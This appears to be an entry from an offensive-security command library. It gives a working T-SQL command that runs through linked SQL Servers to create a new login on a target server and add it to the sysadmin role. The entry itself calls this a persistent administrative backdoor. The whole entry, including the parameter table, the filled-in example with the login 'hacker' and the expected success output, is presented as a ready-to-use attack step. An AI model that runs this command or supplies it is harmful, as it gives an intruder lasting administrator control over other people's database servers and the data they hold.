---
type: command
executor: sql
data: >-
  EXECUTE('EXECUTE(''CREATE LOGIN $_USERNAME WITH PASSWORD = ''''$_PASSWORD''''
  '') AT "$_TARGET_SERVER"') AT
  "$_LINKED_SERVER";\nEXECUTE('EXECUTE(''sp_addsrvrolemember ''''$_USERNAME''''
  , ''''sysadmin'''' '') AT "$_TARGET_SERVER"') AT "$_LINKED_SERVER";
output: null
platforms:
  - Windows
tags:
  - sql
  - persistence
  - privilege-escalation
verified: true
validated: true
---

# create-sysadmin-login-via-linked-server

## Command

```sql
EXECUTE('EXECUTE(''CREATE LOGIN $_USERNAME WITH PASSWORD = ''''$_PASSWORD'''' '') AT "$_TARGET_SERVER"') AT "$_LINKED_SERVER";
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''$_USERNAME'''' , ''''sysadmin'''' '') AT "$_TARGET_SERVER"') AT "$_LINKED_SERVER";
```

## Description

This command creates a new SQL login on a target server via a linked server and adds it to the sysadmin role, creating a persistent administrative backdoor.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | New login username (e.g., hacker) | Yes |
| $_PASSWORD | Password for the new login (e.g., P@ssword123.) | Yes |
| $_TARGET_SERVER | Target server name (e.g., DOMINIO\SERVER1) | Yes |
| $_LINKED_SERVER | Linked server name (e.g., DOMINIO\SERVER2) | Yes |

## Examples

### Basic Usage

```sql
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2";
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2";
```

## Expected Output

Messages like "The login 'hacker' was created successfully." and "The server principal 'hacker' has been added to the 'sysadmin' role." No result set; verify by attempting login with the new credentials.

## Related

- [[procedures/Execute-Queries-via-Linked-SQL-Servers]]
